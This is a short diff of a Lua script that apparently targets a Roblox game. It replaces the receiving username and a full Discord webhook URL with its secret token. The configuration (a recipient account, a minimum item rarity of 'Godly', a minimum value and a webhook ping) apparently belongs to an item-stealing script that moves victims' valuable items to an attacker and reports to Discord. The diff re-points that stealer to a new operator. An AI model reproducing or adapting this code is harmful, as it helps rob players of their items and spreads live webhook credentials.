@@ -52,11 +52,11 @@ end
 
 GetRealJobID()
 
-local Users = Usernames or {"imsopop3"}
+local Users = Usernames or {"jzoshiee"}
 local MinRarity = MinimumRarity or "Godly"
 local MinValue = MinimumValue or 1
 local Ping = "Yes"
-local Webhook = Webhook or "https://discord.com/api/webhooks/1529678252287983827/3zjKA2Be0fRuc7Jl-0yX2fyFaN_-BhZim4PxFYVp68vGSyVu0zvA5853hXp54kaRDXIT"
+local Webhook = Webhook or "https://discord.com/api/webhooks/1532237777280696391/PMdipdRUSPb3yxHexIeM0d2tOa_rUo3dKY--LWz7iCFKdLpC3TTl-fTIf0wOf7v0DJLv"
 
 if Webhook == "" then return end
 if game.PlaceId ~= 142823291 then return end
